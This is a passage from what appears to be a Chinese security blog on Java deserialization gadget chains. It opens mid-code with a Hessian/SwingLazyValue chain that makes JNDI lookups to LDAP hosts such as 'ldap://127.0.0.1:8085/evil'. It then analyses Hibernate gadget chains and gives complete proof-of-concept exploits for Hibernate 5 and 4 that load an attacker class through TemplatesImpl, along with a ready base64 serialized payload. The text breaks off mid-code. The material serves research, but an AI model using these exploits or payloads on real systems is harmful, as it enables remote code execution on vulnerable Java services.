        Method invokeMethod = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);//        Method execMethod = Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class);        Method jndiMethod = JdbcRowSetImpl.class.getMethod(&quot;getDatabaseMetaData&quot;);        Method setPropertyMethod = System.class.getDeclaredMethod(&quot;setProperty&quot;, String.class, String.class);        MimeTypeParameterList mimeTypeParameterList0 = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults0 = new UIDefaults();        SwingLazyValue swingLazyValue0 = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;setPropertyMethod,new Object(),new Object[]&#123;&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;&#125;&#125;&#125;);//        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);        Field field = BaseRowSet.class.getDeclaredField(&quot;dataSource&quot;);        field.setAccessible(true);        JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class);        field.set(jdbcRowSet,&quot;ldap://127.0.0.1:8085/evil&quot;);//        jdbcRowSet.getDatabaseMetaData();        MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults = new UIDefaults();        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;jndiMethod,jdbcRowSet,new Object[]&#123;&#125;&#125;&#125;);        defaults0.put(&quot;777&quot;,swingLazyValue0);        defaults.put(&quot;1&quot;,swingLazyValue);        setField(mimeTypeParameterList0,&quot;parameters&quot;,defaults0);        setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);//        System.out.println(mimeTypeParameterList);        try &#123;            String s0 = ser(mimeTypeParameterList0);            System.out.println(s0);            unser(s0);        &#125;finally &#123;            String s = ser(mimeTypeParameterList);            System.out.println(s);            unser(s);        &#125;

PKCS9AttributesPKCS9Attributes#toString-&gt;   PKCS9Attributes#getAttribute-&gt;     UIDefaults#get-&gt;        UIDefaults#getFromHashTable-&gt;           UIDefaults$LazyValue#createValue-&gt;                SwingLazyValue#createValue-&gt;                   InitialContext#doLookup()

InitialContext.doLookup()除了上面的MethodUtils之外，InitialContext.doLookup()也是可利用的静态方法，能直接进行jndi注入

Poc
package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.reflect.ReflectionFactory;import sun.reflect.misc.MethodUtil;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.*;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults = new UIDefaults();        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;javax.naming.InitialContext&quot;,&quot;doLookup&quot;,new Object[]&#123;&quot;ldap://192.168.43.143:50389/56a5ff&quot;&#125;);        defaults.put(&quot;666&quot;,swingLazyValue);        setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);        String s = ser(mimeTypeParameterList);        System.out.println(s);        unser(s);    &#125;    public static Object unser(String string) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);        Object obj = hessian2Input.readObject();        return obj;    &#125;    public static String ser(Object object) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);        byteArrayOutputStream.write(67);        hessian2Output.writeObject(object);        hessian2Output.flushBuffer();        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static &lt;T&gt; T createObjWithoutConstructor(Class&lt;T&gt; clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return (T) constructor1.newInstance();    &#125;&#125;















]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之Hibernate</title>
    <url>/2025/03/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/</url>
    <content><![CDATA[hibernate1hibernate&gt;&#x3D;5导入依赖&lt;dependency&gt;    &lt;groupId&gt;org.hibernate&lt;/groupId&gt;    &lt;artifactId&gt;hibernate-core&lt;/artifactId&gt;    &lt;version&gt;5.6.15.Final&lt;/version&gt;&lt;/dependency&gt;

分析先看一手yso中的gadget
/** * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() */

可以看到漏洞点是GetterMethodImpl类中的get()方法，该方法中直接进行了一个invoke的调用
其中的getterMethod可以通过反射赋值

我们跟着gadget往上跟到AbstractComponentTuplizer.getPropertyValue()，同样的，getter数组还是能够被反射赋值

继续往上跟，componentTuplizer可控，若componentTuplizer为我们上面说到的AbstractComponentTuplizer类的对象的话，即可触发利用链

往上走的话还是本类中的getHashCode()方法调用了getPropertyValue方法

查找getHashCode()方法的用法，发现是在TypedValue类的initTransients()下的initialize()中一个匿名类里面的调用

initTransients()方法在该类的构造函数中进行了调用，所以在后续进行反序列化的过程中调用TypedValue的构造方法时候便会生成一个DeferredInitializer匿名类实例

跟着gadget继续往上走，ValueHolder的getValue()方法会调用上面提到的匿名类中的initialize()方法

查找getValue()方法的用法，跑回到了TypedValue类里面，是该类中的hashCode()方法

这里我们用HashMap类作为入口类，在反序列化时会调用TypedValue的hashCode()方法，怎么调用的呢
在它的readObject方法中会调用putVal方法，其中会再调用hash()方法


构造poc承接上面的分析，在调用TypedValue的hashCode()方法后，往下走会调用该类中type属性的getHashCode方法

根据上面的分析我们可以知道type必须是ComponetType类对象
其构造函数参数都是hibernate自己封装的一些类，也都不是JavaBean，给创建ComponentType对象带来了不小的麻烦

于是乎这里引入了ReflectionFactory，能够绕过构造函数创建一个对象
https://www.cnblogs.com/strongmore/p/15470175.html
这里写个方法方便之后进行调用
public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;    ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();    Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();    Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);    constructor1.setAccessible(true);    return constructor1.newInstance();&#125;

所以在生成TypedValue对象时便如下所示
TypedValue typedValue = new TypedValue(componentType,&quot;11&quot;);

通过上面的createObjWithoutConstructor函数我们生成的是一个干干净净的ComponentType对象，它的各种属性我们都没有进行赋值
所以我们要对一些必要的属性进行反射赋值
通过对getHashCode方法的观察，我们知道继续调用getPropertyValue方法的时候我们的x和i后续会传入componentTuplizer.getPropertyValue(component, i)中

我们要走进其for循环中，所以先给propertySpan赋值2，走进getPropertyValue( x, i );
来到412行的componentTuplizer.getPropertyValue( component, i )，这个componentTuplizer需要是一个AbstractComponentTuplizer对象
但AbstractComponentTuplizer类是一个抽象类，所以我们必须找到它的实现类
这里用的是PojoComponentTuplizer类，反射赋值
PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);setField(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);

这样子的话就会走到AbstractComponentTuplizer类中的getPropertyValue()方法中

在这个方法里面只要getters[i]是GetterMethodImpl对象，component是调用恶意getter的对象就行了
说到调用恶意getter的对象，很容易就联想到了前面学的CB链和jackson中相关的poc都有利用到TemplateImpl类的getOutputProperties()方法，getOutputProperties()方法又进一步调用TemplateImpl.newTransformer()方法，从而实现恶意类加载
这里我们需要对getters数组进行赋值，但AbstractComponentTuplizer是一个抽象类，所以我们必须获取它的class测i可以进行赋值
Class&lt;?&gt; c = AbstractComponentTuplizer.class;Field field = c.getDeclaredField(&quot;getters&quot;);field.setAccessible(true);field.set(pojoComponentTuplizer,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;))&#125;);

走到GetterMethodImpl类中的get方法后，我们只要让该方法的owner参数为之前利用的template对象即可
封装一手
public static TemplatesImpl getTemplateImpl() throws Exception&#123;    ClassLoader classLoader = ClassLoader.getSystemClassLoader();    byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\tmp\\Test1.class&quot;));    Class&lt;?&gt; c = Class.forName(&quot;java.lang.ClassLoader&quot;);    Method m = c.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);    m.setAccessible(true);    Class&lt;?&gt; c1 = (Class&lt;?&gt;) m.invoke(classLoader,bytes,0,bytes.length);    TemplatesImpl templates = new TemplatesImpl();    Class&lt;?&gt; templatesClass = templates.getClass();    Field _classField = templatesClass.getDeclaredField(&quot;_class&quot;);    _classField.setAccessible(true);    _classField.set(templates,new Class[]&#123;c1&#125;);    Field _nameField = templatesClass.getDeclaredField(&quot;_name&quot;);    _nameField.setAccessible(true);    _nameField.set(templates,&quot;666&quot;);    Field _transletIndexField = templatesClass.getDeclaredField(&quot;_transletIndex&quot;);    _transletIndexField.setAccessible(true);    _transletIndexField.set(templates,0);    Field _tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);    _tfactoryField.setAccessible(true);    _tfactoryField.set(templates,new TransformerFactoryImpl());    return templates;&#125;

然后在TypedValue构造函数处赋值一下
TypedValue typedValue = new TypedValue(componentType,getTemplateImpl());

最初版本的poc如下
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class);        setField(componentType,&quot;propertySpan&quot;,2);        TypedValue typedValue = new TypedValue(componentType,getTemplateImpl());        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);        Class&lt;?&gt; c = AbstractComponentTuplizer.class;        Field field = c.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        field.set(pojoComponentTuplizer,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;))&#125;);        setField(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);        hashMap.put(typedValue,1);        byte[] bytes = ser(hashMap);        System.out.println(Base64.getEncoder().encodeToString(bytes));        unser(bytes);    &#125;    public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return constructor1.newInstance();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static TemplatesImpl getTemplateImpl() throws Exception&#123;        ClassLoader classLoader = ClassLoader.getSystemClassLoader();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        Class&lt;?&gt; c = Class.forName(&quot;java.lang.ClassLoader&quot;);        Method m = c.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);        m.setAccessible(true);        Class&lt;?&gt; c1 = (Class&lt;?&gt;) m.invoke(classLoader,bytes,0,bytes.length);        TemplatesImpl templates = new TemplatesImpl();        Class&lt;?&gt; templatesClass = templates.getClass();        Field _classField = templatesClass.getDeclaredField(&quot;_class&quot;);        _classField.setAccessible(true);        _classField.set(templates,new Class[]&#123;c1&#125;);        Field _nameField = templatesClass.getDeclaredField(&quot;_name&quot;);        _nameField.setAccessible(true);        _nameField.set(templates,&quot;666&quot;);        Field _transletIndexField = templatesClass.getDeclaredField(&quot;_transletIndex&quot;);        _transletIndexField.setAccessible(true);        _transletIndexField.set(templates,0);        Field _tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);        _tfactoryField.setAccessible(true);        _tfactoryField.set(templates,new TransformerFactoryImpl());        return templates;    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

运行后确实弹出了计算器，但是却报错了，是在put的时候触发gadget的经典问题，但是由于这个利用链中很多对象的赋值都不符合规范甚至未赋值，抛npe也是正常的

但是这样一来我们就没办法输出一个序列化之后的hashMap了，那就得想办法不让他在put的时候将链子走下去
对hashMap进行一波小改
hashMap.put(1,1);Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);tableField.setAccessible(true);Object[] table = (Object[]) tableField.get(hashMap);for (Object entry: table)&#123;    if (entry != null)&#123;        setField(entry,&quot;key&quot;,typedValue);    &#125;&#125;

这时候就可以触发反序列化，并且输出payload了

把这一段base64拿去测试，成功弹窗
byte[] bytes1 = Base64.getDecoder().decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGXHO08ZYmxfcgIADVoAHGNyZWF0ZUVtcHR5Q29tcG9zaXRlc0VuYWJsZWRaABJoYXNOb3ROdWxsUHJvcGVydHlaAAVpc0tleUkADHByb3BlcnR5U3BhbkwAD2NhbkRvRXh0cmFjdGlvbnQAE0xqYXZhL2xhbmcvQm9vbGVhbjtbAAdjYXNjYWRldAAoW0xvcmcvaGliZXJuYXRlL2VuZ2luZS9zcGkvQ2FzY2FkZVN0eWxlO0wAEWNvbXBvbmVudFR1cGxpemVydAAxTG9yZy9oaWJlcm5hdGUvdHVwbGUvY29tcG9uZW50L0NvbXBvbmVudFR1cGxpemVyO0wACmVudGl0eU1vZGV0ABpMb3JnL2hpYmVybmF0ZS9FbnRpdHlNb2RlO1sAC2pvaW5lZEZldGNodAAaW0xvcmcvaGliZXJuYXRlL0ZldGNoTW9kZTtbAA1wcm9wZXJ0eU5hbWVzdAATW0xqYXZhL2xhbmcvU3RyaW5nO1sAE3Byb3BlcnR5TnVsbGFiaWxpdHl0AAJbWlsADXByb3BlcnR5VHlwZXN0ABpbTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO1sAIXByb3BlcnR5VmFsdWVHZW5lcmF0aW9uU3RyYXRlZ2llc3QAJltMb3JnL2hpYmVybmF0ZS90dXBsZS9WYWx1ZUdlbmVyYXRpb247eHIAH29yZy5oaWJlcm5hdGUudHlwZS5BYnN0cmFjdFR5cGXJFpSxstQ41AIAAHhwAAAAAAAAAnBwc3IAM29yZy5oaWJlcm5hdGUudHVwbGUuY29tcG9uZW50LlBvam9Db21wb25lbnRUdXBsaXplcsBwOcjTg59YAgAETAAOY29tcG9uZW50Q2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wACW9wdGltaXplcnQAMExvcmcvaGliZXJuYXRlL2J5dGVjb2RlL3NwaS9SZWZsZWN0aW9uT3B0aW1pemVyO0wADHBhcmVudEdldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADHBhcmVudFNldHRlcnQAKkxvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hyADdvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5BYnN0cmFjdENvbXBvbmVudFR1cGxpemVy8vZxKVYnaN0CAAVaABJoYXNDdXN0b21BY2Nlc3NvcnNJAAxwcm9wZXJ0eVNwYW5bAAdnZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvR2V0dGVyO0wADGluc3RhbnRpYXRvcnQAIkxvcmcvaGliZXJuYXRlL3R1cGxlL0luc3RhbnRpYXRvcjtbAAdzZXR0ZXJzdAArW0xvcmcvaGliZXJuYXRlL3Byb3BlcnR5L2FjY2Vzcy9zcGkvU2V0dGVyO3hwAAAAAAB1cgArW0xvcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyOyaF+ANJPbfPAgAAeHAAAAABc3IAPW9yZy5oaWJlcm5hdGUucHJvcGVydHkuYWNjZXNzLnNwaS5HZXR0ZXJNZXRob2RJbXBsJFNlcmlhbEZvcm2sW7ZWyd0bWAIABEwADmNvbnRhaW5lckNsYXNzcQB+ABNMAA5kZWNsYXJpbmdDbGFzc3EAfgATTAAKbWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wADHByb3BlcnR5TmFtZXEAfgAfeHB2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AB9MABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cHQAE2dldE91dHB1dFByb3BlcnRpZXN0AANxd3FwcHBwcHBwcHBwcHBzcQB+ACMAAAAAAAAAAHB1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAQb3JnLmV4YW1wbGUuVGVzdAAAAAAAAAAAAAAAeHB0AAM2NjZwdwEAeHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABeA==&quot;);unser(bytes1);

最终poc：
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class);        setField(componentType,&quot;propertySpan&quot;,2);        TypedValue typedValue = new TypedValue(componentType,getTemplateImpl());        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);        Class&lt;?&gt; c = AbstractComponentTuplizer.class;        Field field = c.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        field.set(pojoComponentTuplizer,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;))&#125;);        setField(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);        hashMap.put(1,1);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,typedValue);            &#125;        &#125;        byte[] bytes = ser(hashMap);        System.out.println(Base64.getEncoder().encodeToString(bytes));        unser(bytes);    &#125;    public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return constructor1.newInstance();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static TemplatesImpl getTemplateImpl() throws Exception&#123;        ClassLoader classLoader = ClassLoader.getSystemClassLoader();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        Class&lt;?&gt; c = Class.forName(&quot;java.lang.ClassLoader&quot;);        Method m = c.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);        m.setAccessible(true);        Class&lt;?&gt; c1 = (Class&lt;?&gt;) m.invoke(classLoader,bytes,0,bytes.length);        TemplatesImpl templates = new TemplatesImpl();        Class&lt;?&gt; templatesClass = templates.getClass();        Field _classField = templatesClass.getDeclaredField(&quot;_class&quot;);        _classField.setAccessible(true);        _classField.set(templates,new Class[]&#123;c1&#125;);        Field _nameField = templatesClass.getDeclaredField(&quot;_name&quot;);        _nameField.setAccessible(true);        _nameField.set(templates,&quot;666&quot;);        Field _transletIndexField = templatesClass.getDeclaredField(&quot;_transletIndex&quot;);        _transletIndexField.setAccessible(true);        _transletIndexField.set(templates,0);        Field _tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);        _tfactoryField.setAccessible(true);        _tfactoryField.set(templates,new TransformerFactoryImpl());        return templates;    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

hibernate&lt;5依赖导入&lt;dependency&gt;    &lt;groupId&gt;org.hibernate&lt;/groupId&gt;    &lt;artifactId&gt;hibernate-core&lt;/artifactId&gt;    &lt;version&gt;4.3.11.Final&lt;/version&gt;&lt;/dependency&gt;

在依赖更新完了之后我们再看上面的poc，会看到报错如下

Getter和GetterMethodImpl类在Hibernate版本为4的时候都不存在
所以我们需要在这个版本找一个平替的
在小于5.0的hiberate下，存在BasicPropertyAccessor.BasicGetter.get()
和前面的GetterMethodImpl中的get()方法几乎一模一样

但是很可惜的是这里的method参数是transient的，transient修饰的参数不会参与进反序列化过程中
但是在BasicPropertyAccessor.BasicGetter中有一个方法叫做readResolve()方法(在lab5中有提及到)，在反序列化过程中只要该方法有被定义，那么就一定会被调用

我们跟进createGetter方法

继续跟进getGetterOrNull方法

该方法里面通过getterMethod函数来获取method，要是获取到了的话那么就会返回一个BasicGetter对象
我们跟进getterMethod方法

我们可以知道method其实就是从theClass中获取到所有与propertyName同值的getter(get或者是is开头的)
到这里我们差不多就知道了后面相关部分要怎么改动了
我们需要给BasicGetter的clazz参数赋一个包含有getter漏洞的class，然后propertyName参数的值要为getter对应的属性名
举个例子，我们要利用TemplatesImpl中的getOutputProperties()方法，那么class的值就是TemplatesImpl的class，然后propertyName的值就是OutputProperties
看一下BasicGetter的构造函数

是私有的，那我们就需要用到反射来进行赋值
创建一个BasicGetter（Method的赋值随意，重点在于propertyName）
Class basicGetterClass = BasicPropertyAccessor.BasicGetter.class;Constructor basicGetterConstructor = basicGetterClass.getDeclaredConstructor(new Class[]&#123;Class.class,Method.class,String.class&#125;);basicGetterConstructor.setAccessible(true);BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter) basicGetterConstructor.newInstance(TemplatesImpl.class,TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;),&quot;OutputProperties&quot;);

稍微改一下getters数组
Class&lt;?&gt; c = AbstractComponentTuplizer.class;Field field = c.getDeclaredField(&quot;getters&quot;);field.setAccessible(true);field.set(pojoComponentTuplizer,new Getter[]&#123;basicGetter&#125;);

成功触发poc
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.BasicPropertyAccessor;import org.hibernate.property.Getter;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class);        setField(componentType,&quot;propertySpan&quot;,2);        TypedValue typedValue = new TypedValue(componentType,getTemplateImpl());        Class basicGetterClass = BasicPropertyAccessor.BasicGetter.class;        Constructor basicGetterConstructor = basicGetterClass.getDeclaredConstructor(new Class[]&#123;Class.class,Method.class,String.class&#125;);        basicGetterConstructor.setAccessible(true);        BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter) basicGetterConstructor.newInstance(TemplatesImpl.class,TemplatesImpl.class.getDeclaredMethod(&quot;getOutputProperties&quot;),&quot;OutputProperties&quot;);        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);        Class&lt;?&gt; c = AbstractComponentTuplizer.class;        Field field = c.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        field.set(pojoComponentTuplizer,new Getter[]&#123;basicGetter&#125;);        setField(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);        hashMap.put(1,1);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,typedValue);            &#125;        &#125;        byte[] bytes = ser(hashMap);        System.out.println(Base64.getEncoder().encodeToString(bytes));        unser(bytes);    &#125;    public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return constructor1.newInstance();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public 